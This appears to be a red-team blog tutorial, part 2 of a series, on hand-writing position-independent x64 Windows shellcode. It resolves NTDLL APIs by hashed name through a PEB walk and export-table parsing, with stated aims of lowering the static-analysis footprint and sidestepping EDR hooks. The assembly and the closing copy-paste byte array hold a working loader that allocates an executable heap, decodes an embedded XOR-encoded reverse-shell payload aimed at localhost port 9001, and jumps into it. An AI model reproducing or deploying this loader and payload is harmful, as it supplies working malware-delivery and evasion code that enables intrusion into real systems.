---
title:  PIC Shellcode from the Ground up - Part 2
header:
  teaser: "/assets/images/memmapper2.png"
categories:
  - Shellcode
  - PIC
tags:
  - x64 assembly
  - '2025'
  - g3tsyst3m
  - x64 shellcode
  - PIC shellcode
---

Let's `PIC` back up where we left off shall we? 😸 I gave you the framework for developing PIC friendly shellcode back in Part 1.  We went from the original code written in a high level language (C++), down to a pseudo low level representation of that C++ code.  I say pseudo low level because after our C++ code, we then used a combination of assembly and externs to locate the memory address of `HeapCreate` and `HeapAlloc`.  This is sort of like inputting a cheat code, since we don't have to resort to walking the PE headers, specifically the PE export table, to locate our APIs.  However, this time around we will NOT be using externs.  We will be locating TEB/PEB, walking the familiar PE headers, and finding our APIs in question manually without help from externs.  We will also hash our APIs to make them easier to lookup and lower our static analysis footprint.  Let's dive in!

Locating NTDLL.DLL
-

For this code exercise, we're going to locate the base address for `NTDLL.DLL` instead of `KERNEL32.DLL`

Why?  Because foolish me didn't realize that `HeapAlloc` is just a stub in `Kernel32.dll` that is redirected/forwarded to `RtlAllocateHeap`, which is contained within the NTDLL library.  😆  So, all that we really needed to change was loading the NTDLL base address instead of the usual Kernel32 base address.  I'll show you what that looks like now.  You'll also see our shellcode at the start of the code too just FYI.  That hasn't changed from the original assembly template we wrote back in `part 1`.

```nasm
; nasm -fwin64 [x64findkernel32.asm]
; ld -m i386pep -N -o x64findkernel32.exe x64findkernel32.obj
; externs: ld -m i386pep -N -LC:\mingw64\x86_64-w64-mingw32\lib asmsock.obj -o asmsock.exe -lkernel32
; https://github.com/brechtsanders/winlibs_mingw/releases/download/14.2.0posix-19.1.1-12.0.0-ucrt-r2/winlibs-x86_64-posix-seh-gcc-14.2.0-llvm-19.1.1-mingw-w64ucrt-12.0.0-r2.zip

BITS 64

section .shellstuff rdata read
; shellcode for an x64 reverse shell, port 9001 / Localhost (127.0.0.1)
encoded_shellcode:
db 0x48, 0x8d, 0x35, 0x23, 0x00, 0x00, 0x00, 0x44, 0x8a, 0x0d, 0xb5, 0x01, 0x00, 0x00, 0xb9, 0xd0, 0x01, 0x00, 0x00, 0x8a, 0x06, 0x44, 0x30, 0xc8, 0xf6, 0xd0, 0x88, 0x06, 0x48, 0xff, 0xc6, 0xe2, 0xf2, 0x48, 0x8d, 0x05, 0x02, 0x00, 0x00, 0x00, 0xff, 0xe0, 0xaf, 0x1b, 0xd0, 0xb7, 0xa3, 0xbb, 0x93, 0x53, 0x53, 0x53, 0x12, 0x02, 0x12, 0x03, 0x01, 0x02, 0x05, 0x1b, 0x62, 0x81, 0x36, 0x1b, 0xd8, 0x01, 0x33, 0x1b, 0xd8, 0x01, 0x4b, 0x1b, 0xd8, 0x01, 0x73, 0x1b, 0xd8, 0x21, 0x03, 0x1b, 0x5c, 0xe4, 0x19, 0x19, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x6f, 0x32, 0x2f, 0x51, 0x7f, 0x73, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0xb1, 0xbe, 0x01, 0x12, 0x02, 0x1b, 0xd8, 0x01, 0x73, 0xd8, 0x11, 0x6f, 0x1b, 0x52, 0x83, 0xd8, 0xd3, 0xdb, 0x53, 0x53, 0x53, 0x1b, 0xd6, 0x93, 0x27, 0x34, 0x1b, 0x52, 0x83, 0x03, 0xd8, 0x1b, 0x4b, 0x17, 0xd8, 0x13, 0x73, 0x1a, 0x52, 0x83, 0xb0, 0x05, 0x1b, 0xac, 0x9a, 0x12, 0xd8, 0x67, 0xdb, 0x1b, 0x52, 0x85, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0x6b, 0xb3, 0x26, 0xa2, 0x1f, 0x50, 0x1f, 0x77, 0x5b, 0x16, 0x6a, 0x82, 0x26, 0x8b, 0x0b, 0x17, 0xd8, 0x13, 0x77, 0x1a, 0x52, 0x83, 0x35, 0x12, 0xd8, 0x5f, 0x1b, 0x17, 0xd8, 0x13, 0x4f, 0x1a, 0x52, 0x83, 0x12, 0xd8, 0x57, 0xdb, 0x1b, 0x52, 0x83, 0x12, 0x0b, 0x12, 0x0b, 0x0d, 0x0a, 0x09, 0x12, 0x0b, 0x12, 0x0a, 0x12, 0x09, 0x1b, 0xd0, 0xbf, 0x73, 0x12, 0x01, 0xac, 0xb3, 0x0b, 0x12, 0x0a, 0x09, 0x1b, 0xd8, 0x41, 0xba, 0x04, 0xac, 0xac, 0xac, 0x0e, 0x1a, 0xed, 0x24, 0x20, 0x61, 0x0c, 0x60, 0x61, 0x53, 0x53, 0x12, 0x05, 0x1a, 0xda, 0xb5, 0x1b, 0xd2, 0xbf, 0xf3, 0x52, 0x53, 0x53, 0x1a,0xda, 0xb6, 0x1a, 0xef, 0x51, 0x53, 0x70, 0x7a, 0x2c, 0x53, 0x53, 0x52, 0x12, 0x07, 0x1a, 0xda, 0xb7, 0x1f, 0xda, 0xa2, 0x12, 0xe9, 0x1f, 0x24, 0x75, 0x54, 0xac, 0x86, 0x1f, 0xda, 0xb9, 0x3b, 0x52, 0x52, 0x53, 0x53, 0x0a, 0x12, 0xe9, 0x7a, 0xd3, 0x38, 0x53, 0xac, 0x86, 0x03, 0x03, 0x1e, 0x62, 0x9a, 0x1e, 0x62, 0x93, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x91, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x92, 0x12, 0xe9, 0xb9, 0x5c, 0x8c, 0xb3, 0xac, 0x86, 0x1b, 0xda, 0x94, 0x39, 0x43, 0x12, 0x0b, 0x1f, 0xda, 0xb1, 0x1b, 0xda, 0xaa, 0x12, 0xe9, 0xca, 0xf6, 0x27, 0x32, 0xac, 0x86, 0x1b, 0xd2, 0x97, 0x13, 0x51, 0x53, 0x53, 0x1a, 0xeb, 0x30, 0x3e, 0x37, 0x53, 0x53, 0x53, 0x53, 0x53, 0x12, 0x03, 0x12, 0x03, 0x1b, 0xda, 0xb1, 0x04, 0x04,0x04, 0x1e, 0x62, 0x93, 0x39, 0x5e, 0x0a, 0x12, 0x03, 0xb1, 0xaf, 0x35, 0x94, 0x17, 0x77, 0x07, 0x52, 0x52, 0x1b, 0xde, 0x17, 0x77, 0x4b, 0x95, 0x53, 0x3b, 0x1b, 0xda, 0xb5, 0x05, 0x03, 0x12, 0x03, 0x12, 0x03, 0x12, 0x03, 0x1a, 0xac, 0x93, 0x12, 0x03, 0x1a, 0xac, 0x9b, 0x1e, 0xda, 0x92, 0x1f, 0xda, 0x92, 0x12, 0xe9, 0x2a, 0x9f, 0x6c, 0xd5, 0xac, 0x86, 0x1b, 0x62, 0x81, 0x1b, 0xac, 0x99, 0xd8, 0x5d, 0x12, 0xe9, 0x5b, 0xd4, 0x4e, 0x33, 0xac, 0x86, 0xe8, 0xa3, 0xe6, 0xf1, 0x05, 0x12, 0xe9, 0xf5, 0xc6, 0xee, 0xce, 0xac, 0x86, 0x1b, 0xd0, 0x97, 0x7b, 0x6f, 0x55, 0x2f, 0x59, 0xd3, 0xa8, 0xb3, 0x26, 0x56, 0xe8, 0x14, 0x40, 0x21, 0x3c, 0x39, 0x53, 0x0a, 0x12, 0xda, 0x89, 0xac, 0x86, 0x53, 0x53, 0x53, 0x53
encoded_shellcode_total equ $ - encoded_shellcode

section .data 
section .text
global main

main:

sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
	
xor rcx, rcx             ; RCX = 0

; Access TEB base: GS segment points to TEB
mov rax, gs:[0x30]
; Access PEB from TEB (TEB + 0x60)
mov rax, [rax + 0x60]

;mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr (_PEB_LDR_DATA)
mov rsi,[rax+0x10]       ;PEB.Ldr->InMemOrderModuleList

checkit:
mov rsi, [rsi] 
mov rcx, [rsi + 0x60] 

mov rbx, [rcx]
mov rdx, 0x6C00640074006E ;UNICODE "N T D L" from NTDLL.DLL
cmp rbx, rdx
jz foundit
jnz checkit

foundit:
mov rbx, [rsi + 0x30]

mov r8, rbx              ; mov NTDLL.dll base addr into r8
```

We can consider the above the Preamble for most PIC shellcode.  Mine will likely be a variation on a theme to what you'll find used in C2 frameworks and elsewhere, but the general principle is the same.  I'm first locating the Thread Environment Block (TEB), then we proceed to locate and walk the Process Environment Block (PEB).  The approach we're taking here is really effective.  

The reason being, is that we will locate NTDLL (or kernel32, etc) by name and not mathematically like the old school method of locating kernel32/ntdll base address by some hardcoded offset.  Notice how I'm looking for the unicode value **N T D L**?  Say EDR hooks our program and we had previously hardcoded ntdll as the 3rd item to grab when walking the PEB?  The PEB could be hooked by the EDR, and the 3rd position, normally reserved for kernel32.dll or ntdll, would have the hooked dll in its place.  This is **NOT** good!  However, since we're actually searching for NTDLL by name, we are pretty much guaranteed to always find the appropriate one!  😼

Go ahead and compile that code and let's check it out, shall we:

- **nasm -fwin64 blog_pic_part2.asm**
- **ld -m i386pep -N -o blog_pic_part2.exe blog_pic_part2.obj**

Now, navigate to **x64Dbg** and open your newly minted, compiled executable. 😸

Hit run and step over (step through) your code until you hit the `cmp rbx, rdx` instruction.  Look at both register values.  Notice anything interesting?  

<img width="1341" height="261" alt="image" src="https://github.com/user-attachments/assets/31b223e3-3fac-43d1-aa0c-3f3afa695567" />

The compare will succeed, since we found NTDLL!  Next, we will jump to the assembly instruction that will locate the actual address of NTDLL and store it in rbx.  

> 00007FF6EDFA103B | 48:8B5E 30                   | mov rbx,qword ptr ds:[rsi+30]          

We will make a copy of this memory address, storing it in the `R8` register to prepare for later needs throughout our code.

Grabbing our Hashed API Strings
-

Before we proceed, let's write a very rudimentary program which will perform a Rotate left 5 (ROL5) + XOR routine against our API strings to hash them.

```cpp
#include <iostream>
#include <windows.h>

DWORD hashString(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = ((hash << 5) | (hash >> 27)) ^ *str; // Rotate left 5 and XOR
        str++;
    }
    return hash;
}

int main() {
    const char* apis[] = { "RtlCreateHeap", "RtlAllocateHeap"};

    for (int i = 0; i < 2; i++) {
        std::cout << "Hash of " << apis[i] << ": " << std::hex << hashString(apis[i]) << std::endl;
    }

    return 0;
}
```

**Go ahead and compile that and run it.  You should get the following:**

<img width="1286" height="91" alt="image" src="https://github.com/user-attachments/assets/32713a19-2cb9-4b15-88f8-98c9a77e39a6" />

Okay, now that wasn't too tricky right?  That's all that is required for our hashing routine.  Go ahead and make a note of those two values for now.  I'll show you how to decode it later using assembly.

Parsing the PE Export Address Table
-

Now we're ready to continue. Let's parse the PE export address table and get the PE export directory address, address of names, number of names, and total number of names (APIs).

```nasm
;=================================================================	
;Code for parsing Export Address Table
;=================================================================
mov ebx, [rbx+0x3C]           ; Get PE header offset (e_lfanew) from DOS header
add rbx, r8                   ; Add PE header offset to NTDLL base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88, avoids nulls and removes 0xff, leaving behind the value we need :)
mov edx, [rbx+rcx]            ; EDX = [PE Header + 0x88] = Export Directory RVA
add rdx, r8                   ; RDX = NTDLL.dll base + Export Directory RVA = Export Directory Address
mov r10d, [rdx+0x14]          ; R10D = NumberOfNames from Export Directory
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; R11D = AddressOfNames RVA
add r11, r8                   ; R11 = AddressOfNames VMA (Virtual Memory Address)
mov r13, r11                  ; Save AddressOfNames pointer in R13 for later name array indexing
mov rcx, r10                  ; Set RCX as countdown loop counter (will decrement through names)
```

I've added comments throughout the entirety of the assembly code, so I'm not going to go in great detail on that.  Just know we need the `addressofnames` and total number of apis to loop over.  We will ultimately be hashing each API string from the AddressofNames string.  We will use our **ROTATE left by 5 + XOR** hash routine against each string.  We will keep the loop active until we find our api string in question.  That's the general breakdown of how this works.  Let me add some more code so you can see how the loop is laid out:

```nasm
;**********************************************************************
; Now, we start cycling through all the API functions
; Starting backwards from Z and working our way to A
; While that's happening, we hash each API with our hashing routine (ROT left 5 + XOR)
; And compare the hashed value with our predetermined hash values and see if there's a match!
;**********************************************************************

ntdllfindfunction:                ; Loop over Export Address Table to find matching WinApi by hash
    jecxz FunctionNameNotFound    ; If RCX = 0, we've checked all names without a match
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA of function name at current index (RCX), R11 points to AddressOfNames array
	                                ; The index calculation [r11+rcx*4] multiplies by 4 because each RVA is a DWORD (4 bytes)
    add rbx, r8                   ; RBX = Function name VMA (add NTDLL base address to RVA)
    dec rcx                       ; Decrement loop counter (searching backwards through names array)
    jmp hashinitiator             ; Jump to hash this function name and compare
FunctionNameNotFound:
    jmp continuation              ; No matching function found, continue execution
```

So, that's a lot to take in.  Let me explain how everything plays out in a simpler fashion, using some screenshots from debugging our code.  Remember, we're working backwards.  So, we'll be starting with 'Z' and working our way to 'A'.  One of the first Windows API strings I see is this one you'll see in the screenshot below. This is once we step over the loop and reach the **add rbx, r8** instruction.

The API string is `wcstoul`

<img width="1176" height="594" alt="image" src="https://github.com/user-attachments/assets/0f9e07b9-98a3-48c1-ad97-73ee5f0a0ab8" />

Throughout this loop, we are constantly jumping to the `hashinitiator` function routine, which hashes each api string with our hashing routine and compares it to both of our hashes to determine if there's a match!
Let's follow the **jmp hashinitiator**.  I'll show you what that looks like in the next section.

Hashing Routine
-

**Here's what that hashinitiator function code routine looks like:**

```nasm
   ;********************************************************
   ; This is our hashing routine where we check if our hash
   ; matches the hash of the current API string
   ;********************************************************

   hashinitiator:
       xor eax, eax
       mov rsi, rbx        ; API name
       xor rbx, rbx
   next_char:
       mov bl, [rsi]       ; load next char
       test bl, bl
       jz check_hash
       rol eax, 5          ; rotate hash left 5 bits
       xor eax, ebx        ; hash ^= char
       inc rsi
       jmp next_char

   ;********************************************************
   ; This is where we check the hash generated and stored in the EAX register
   ; with all of our pretermined hash values
   ; if there's a match that's found, we jump to FunctionNameFound
   ; and save the hash by pushing it to the stack
   ;********************************************************

   check_hash:
   cmp eax, 0xb5cd8965                ; RtlCreateHeap - Compare all bytes of eax with our pretermined hash values
   je FunctionNameFound               ; If match, function found
   cmp eax, 0x4f48603e                ; RtlAllocateHeap
   je FunctionNameFound               ; If match, function found
   
   jmp ntdllfindfunction
```

Now for some visuals to see how this plays out.  First, we copy our string which is currently in RBX, into RSI

<img width="1176" height="274" alt="image" src="https://github.com/user-attachments/assets/43094664-52fa-48a1-910a-e9bc57b890ca" />

Next, we hash each individual character of that string with our rotate left 5 + XOR routine, and compare the hash we get with the hash we're looking for. In this case, it's not a match.  But you get the idea

here's the hash routine applied to the character 'w' in this particular API string:

<img width="1919" height="721" alt="image" src="https://github.com/user-attachments/assets/f640bf3a-4f06-4f32-a0ea-0bcc32d44c24" />

we rotate the hex value for the letter w, '77', left 5 and then xor it.  You should get:

<img width="839" height="541" alt="image" src="https://github.com/user-attachments/assets/877f54f1-3190-407b-9b4e-4265e9e59586" />

We keep this up until we get a full string then we just compare that full hashed string with the two api strings we're looking for.  In this case, it was NOT a match:

<img width="866" height="573" alt="image" src="https://github.com/user-attachments/assets/b1102934-5fe2-42d3-8293-6d94a3570495" />

And here's the hash for `RtlCreateHeap` looks like when we find it:

<img width="1716" height="535" alt="image" src="https://github.com/user-attachments/assets/2ebc0b76-d683-4d2e-a3a3-1eece17e97b1" />

In the next section, I'll show you the register values and stack value for when we find the address of one of our APIs.

Locating our API address values
-

I think I forgot to mention the API's this time around will be RtlCreateHeap and RtlAllocateHeap, the NTDLL equivalents to kernel32's HeapCreate and HeapAlloc.  Ok, so what happens after we find a match?  Well, we need to determine the memory address of the API function!  Crazy enough, that's the whole point of every single line of code up to this point.  Our primary goal is to reproduce what we so easily gathered in **Part 1**, using **externs**...the actual address of each of our APIs.  But I won't keep you waiting.  😸  Here's the function that grabs the API address for both APIs:

```nasm
FunctionNameFound:                ; Get function address from AddressOfFunctions
                                  ; ECX currently holds the name index (after dec in loop)
                                  ; Need to get the ordinal from AddressOfNameOrdinals
   mov rdi, rcx                   ; SAVE the loop counter!
   xor r11, r11
   mov r11d, [rdx+0x24]           ; AddressOfNameOrdinals RVA
   add r11, r8                    ; AddressOfNameOrdinals VMA
   
   inc ecx                        ; Adjust for the dec in loop
   movzx ecx, word [r11+rcx*2]    ; Get ordinal (WORD sized!) from ordinals array
   
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA
   mov r15d, [r11+rcx*4]          ; Use ordinal as index into functions
   add r15, r8                    ; Function address
   push r15                       ; Push the API we found to the stack for retrieval later.  We do this for all of them
   mov rcx, rdi                   ; RESTORE the original loop counter
   mov r11, r13                   ; Restore AddressOfNames pointer
   dec rcx                        ; Continue counting down
   jmp ntdllfindfunction
```

Here's what the registers and stack look like when we compute the API memory address!

<img width="1532" height="752" alt="image" src="https://github.com/user-attachments/assets/e72590fa-874b-4f57-bc95-20cf8941adad" />

Once you run through the Loop a second time, you'll also locate the memory address for `RtlAllocateHeap`. I'll let you do that yourself for homework and catch up with you in our next section!

Using our newly acquired API addresses to call RtlCreateHeap and RtlAllocateHeap!
-

```nasm
continuation:

   ;********************************************************
   ; CONGRATS!  you found all the hashes, let's continue
   ;******************************************************** 	
	
mov r14, [rsp + 0x8]      ;RtlCreateHeap API location on stack
mov r12, [rsp]            ;RtlAllocateHeap API location on stack
; execute resolved APIs
    
xor     r9d, r9d          ; CommitSize  = 0 (let system decide)
mov     r8d, 0x100000     ; ReserveSize = 1 MB (or any non-zero value)
xor     edx, edx          ; HeapBase    = NULL (let system choose)
mov     ecx, 0x00040002   ; Flags = The numeric values for these heap flags are: HEAP_GROWABLE = 0x00000002 and HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
                            ; When you OR them together: HEAP_GROWABLE | HEAP_CREATE_ENABLE_EXECUTE = 0x00040002
                          
call    r14               ; RtlCreateHeap

xor rcx, rcx
		
mov         r8, encoded_shellcode_total ;size of shellcode
mov         edx, 8                      ; zero the memory
mov         rcx, rax                    ; Memory region/Address of Heap
call        r12                         ; RtlAllocateHeap
push rax
pop rdx ; memory address of mapped region of memory
```

This part should look similar to Part 1, with the exception of using NT APIs instead of the kernel32 provided APIs.  We also will need to include a few more parameters before we call our RtlCreateHeap API. 

In part 1, I resorted to using the stack to store a variable but we really don't need to.  I just wanted to show you how you can store variables on the stack.  That being said, we do have both of our NT api addresses on the stack and we need to move them into registers so we can call them!  You'll see I do just that on the first two lines of code in this function.  Notice in the image below, our stack pointer (RSP) now happens to be on RtlAllocateHeap and 8 bytes awat from `RtlAllocateHeap` is `RtlCreateHeap`!  You'll also notice registers R12 and R14 contain our respective API addresses 😸

<img width="1261" height="722" alt="image" src="https://github.com/user-attachments/assets/55ff6e91-f26d-47e0-a72f-5a64dda05d8f" />

Decode Shellcode and jump to it!
-

It's exactly what the title states.  At this point, we've allocated memory on the Heap for our shellcode and now we just need to decode our encoded shellcode.  We will also copy our shellcde byte for byte into the allocated heap memory region we created.  We don't have to use RtlMoveMemory or memcpy, as we can simply use good ole fashioned `mov` instruction in assembly to accomplish this!

```nasm
lea rsi, [rel encoded_shellcode]
mov ecx, encoded_shellcode_total
mov r14, rdx ; save for later
xor rax, rax
	
chunk_reader:
    
mov al, byte [rsi]
mov [rdx], al            ; Here's where we copy our shellcode byte by byte into our allocated Heap memory
inc rsi
test rcx, rcx
jz final
inc rdx
loop chunk_reader
    
final:
jmp r14                  ; Jump to our shellcode in heap memory and execute it!
```

If you use my exact source code for this blog post, just know it's a reverse shell destined for port 9001 on localhost.  I use that a lot for testing purposes.  Speaking of the full source code, I'll list it now!

**Full Source Code Below:** 

[Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2025-11-25-PIC%20Shellcode%20from%20the%20Ground%20up%20-%20Part%202)

Compile it and convert to an .obj object file and extract the shellcode bytes from the object file per the usual routine.  Pop that into your favorite shellcode loader, and you're golden!  You have now written x64 assembly code that is completely PIC friendly and can be compiled and ran without issue in your red team engagements 😸  Here's the shellcode if anyone needs it for a quick copy/paste reference.  Funny enough, it's essentially shellcode loading shellcode.  😸

```cpp
const unsigned char shellcode[] = {
0x48, 0x8d, 0x35, 0x23, 0x00, 0x00, 0x00, 0x44, 0x8a, 0x0d, 0xb5, 0x01, 0x00, 0x00, 0xb9, 0xd0, 0x01, 0x00, 0x00, 0x8a, 0x06, 0x44, 0x30, 0xc8, 0xf6, 0xd0, 0x88, 0x06, 0x48, 0xff, 0xc6, 0xe2, 0xf2, 0x48, 0x8d, 0x05, 0x02, 0x00, 0x00, 0x00, 0xff, 0xe0, 0xaf, 0x1b, 0xd0, 0xb7, 0xa3, 0xbb, 0x93, 0x53, 0x53, 0x53, 0x12, 0x02, 0x12, 0x03, 0x01, 0x02, 0x05, 0x1b, 0x62, 0x81, 0x36, 0x1b, 0xd8, 0x01, 0x33, 0x1b, 0xd8, 0x01, 0x4b, 0x1b, 0xd8, 0x01, 0x73, 0x1b, 0xd8, 0x21, 0x03, 0x1b, 0x5c, 0xe4, 0x19, 0x19, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x6f, 0x32, 0x2f, 0x51, 0x7f, 0x73, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0xb1, 0xbe, 0x01, 0x12, 0x02, 0x1b, 0xd8, 0x01, 0x73, 0xd8, 0x11, 0x6f, 0x1b, 0x52, 0x83, 0xd8, 0xd3, 0xdb, 0x53, 0x53, 0x53, 0x1b, 0xd6, 0x93, 0x27, 0x34, 0x1b, 0x52, 0x83, 0x03, 0xd8, 0x1b, 0x4b, 0x17, 0xd8, 0x13, 0x73, 0x1a, 0x52, 0x83, 0xb0, 0x05, 0x1b, 0xac, 0x9a, 0x12, 0xd8, 0x67, 0xdb, 0x1b, 0x52, 0x85, 0x1e, 0x62, 0x9a, 0x1b, 0x62, 0x93, 0xff, 0x12, 0x92, 0x9a, 0x5e, 0x12, 0x52, 0x92, 0x6b, 0xb3, 0x26, 0xa2, 0x1f, 0x50, 0x1f, 0x77, 0x5b, 0x16, 0x6a, 0x82, 0x26, 0x8b, 0x0b, 0x17, 0xd8, 0x13, 0x77, 0x1a, 0x52, 0x83, 0x35, 0x12, 0xd8, 0x5f, 0x1b, 0x17, 0xd8, 0x13, 0x4f, 0x1a, 0x52, 0x83, 0x12, 0xd8, 0x57, 0xdb, 0x1b, 0x52, 0x83, 0x12, 0x0b, 0x12, 0x0b, 0x0d, 0x0a, 0x09, 0x12, 0x0b, 0x12, 0x0a, 0x12, 0x09, 0x1b, 0xd0, 0xbf, 0x73, 0x12, 0x01, 0xac, 0xb3, 0x0b, 0x12, 0x0a, 0x09, 0x1b, 0xd8, 0x41, 0xba, 0x04, 0xac, 0xac, 0xac, 0x0e, 0x1a, 0xed, 0x24, 0x20, 0x61, 0x0c, 0x60, 0x61, 0x53, 0x53, 0x12, 0x05, 0x1a, 0xda, 0xb5, 0x1b, 0xd2, 0xbf, 0xf3, 0x52, 0x53, 0x53, 0x1a, 0xda, 0xb6, 0x1a, 0xef, 0x51, 0x53, 0x70, 0x7a, 0x2c, 0x53, 0x53, 0x52, 0x12, 0x07, 0x1a, 0xda, 0xb7, 0x1f, 0xda, 0xa2, 0x12, 0xe9, 0x1f, 0x24, 0x75, 0x54, 0xac, 0x86, 0x1f, 0xda, 0xb9, 0x3b, 0x52, 0x52, 0x53, 0x53, 0x0a, 0x12, 0xe9, 0x7a, 0xd3, 0x38, 0x53, 0xac, 0x86, 0x03, 0x03, 0x1e, 0x62, 0x9a, 0x1e, 0x62, 0x93, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x91, 0x1b, 0xac, 0x93, 0x1b, 0xda, 0x92, 0x12, 0xe9, 0xb9, 0x5c, 0x8c, 0xb3, 0xac, 0x86, 0x1b, 0xda, 0x94, 0x39, 0x43, 0x12, 0x0b, 0x1f, 0xda, 0xb1, 0x1b, 0xda, 0xaa, 0x12, 0xe9, 0xca, 0xf6, 0x27, 0x32, 0xac, 0x86, 0x1b, 0xd2, 0x97, 0x13, 0x51, 0x53, 0x53, 0x1a, 0xeb, 0x30, 0x3e, 0x37, 0x53, 0x53, 0x53, 0x53, 0x53, 0x12, 0x03, 0x12, 0x03, 0x1b, 0xda, 0xb1, 0x04, 0x04, 0x04, 0x1e, 0x62, 0x93, 0x39, 0x5e, 0x0a, 0x12, 0x03, 0xb1, 0xaf, 0x35, 0x94, 0x17, 0x77, 0x07, 0x52, 0x52, 0x1b, 0xde, 0x17, 0x77, 0x4b, 0x95, 0x53, 0x3b, 0x1b, 0xda, 0xb5, 0x05, 0x03, 0x12, 0x03, 0x12, 0x03, 0x12, 0x03, 0x1a, 0xac, 0x93, 0x12, 0x03, 0x1a, 0xac, 0x9b, 0x1e, 0xda, 0x92, 0x1f, 0xda, 0x92, 0x12, 0xe9, 0x2a, 0x9f, 0x6c, 0xd5, 0xac, 0x86, 0x1b, 0x62, 0x81, 0x1b, 0xac, 0x99, 0xd8, 0x5d, 0x12, 0xe9, 0x5b, 0xd4, 0x4e, 0x33, 0xac, 0x86, 0xe8, 0xa3, 0xe6, 0xf1, 0x05, 0x12, 0xe9, 0xf5, 0xc6, 0xee, 0xce, 0xac, 0x86, 0x1b, 0xd0, 0x97, 0x7b, 0x6f, 0x55, 0x2f, 0x59, 0xd3, 0xa8, 0xb3, 0x26, 0x56, 0xe8, 0x14, 0x40, 0x21, 0x3c, 0x39, 0x53, 0x0a, 0x12, 0xda, 0x89, 0xac, 0x86, 0x53, 0x53, 0x53, 0x53, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x31, 0xc9, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x10, 0x48, 0x8b, 0x36, 0x48, 0x8b, 0x4e, 0x60, 0x48, 0x8b, 0x19, 0x48, 0xba, 0x6e, 0x00, 0x74, 0x00, 0x64, 0x00, 0x6c, 0x00, 0x48, 0x39, 0xd3, 0x74, 0x02, 0x75, 0xe5, 0x48, 0x8b, 0x5e, 0x30, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x44, 0x8b, 0x52, 0x14, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x89, 0xdd, 0x4c, 0x89, 0xd1, 0x67, 0xe3, 0x0e, 0x31, 0xdb, 0x41, 0x8b, 0x1c, 0x8b, 0x4c, 0x01, 0xc3, 0x48, 0xff, 0xc9, 0xeb, 0x34, 0xeb, 0x5a, 0x48, 0x89, 0xcf, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x24, 0x4d, 0x01, 0xc3, 0xff, 0xc1, 0x41, 0x0f, 0xb7, 0x0c, 0x4b, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x1c, 0x4d, 0x01, 0xc3, 0x45, 0x8b, 0x3c, 0x8b, 0x4d, 0x01, 0xc7, 0x41, 0x57, 0x48, 0x89, 0xf9, 0x4d, 0x89, 0xeb, 0x48, 0xff, 0xc9, 0xeb, 0xbb, 0x31, 0xc0, 0x48, 0x89, 0xde, 0x48, 0x31, 0xdb, 0x8a, 0x1e, 0x84, 0xdb, 0x74, 0x0a, 0xc1, 0xc0, 0x05, 0x31, 0xd8, 0x48, 0xff, 0xc6, 0xeb, 0xf0, 0x3d, 0x65, 0x89, 0xcd, 0xb5, 0x74, 0xaf, 0x3d, 0x3e, 0x60, 0x48, 0x4f, 0x74, 0xa8, 0xeb, 0x93, 0x4c, 0x8b, 0x74, 0x24, 0x08, 0x4c, 0x8b, 0x24, 0x24, 0x45, 0x31, 0xc9, 0x41, 0xb8, 0x00, 0x00, 0x10, 0x00, 0x31, 0xd2, 0xb9, 0x02, 0x00, 0x04, 0x00, 0x41, 0xff, 0xd6, 0x48, 0x31, 0xc9, 0x41, 0xb8, 0xfa, 0x01, 0x00, 0x00, 0xba, 0x08, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x41, 0xff, 0xd4, 0x50, 0x5a, 0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00, 0xb9, 0xfa, 0x01, 0x00, 0x00, 0x49, 0x89, 0xd6, 0x48, 0x31, 0xc0, 0x8a, 0x06, 0x88, 0x02, 0x48, 0xff, 0xc6, 0x48, 0x85, 0xc9, 0x74, 0x05, 0x48, 0xff, 0xc2, 0xe2, 0xef, 0x41, 0xff, 0xe6
};
```

I initially intended to go deeper on PIC coding, extending this into a series / multiple parts, but I will likely have to reserve deeper explorations into PIC coding some other time.  Perhaps as a course or something.  I'm considering a full on x64 assembly and shellcoding course with videos, code, the works.  If I pull it off, I'll definitely go deeper on PIC shellcode.  Until next time, thanks all!
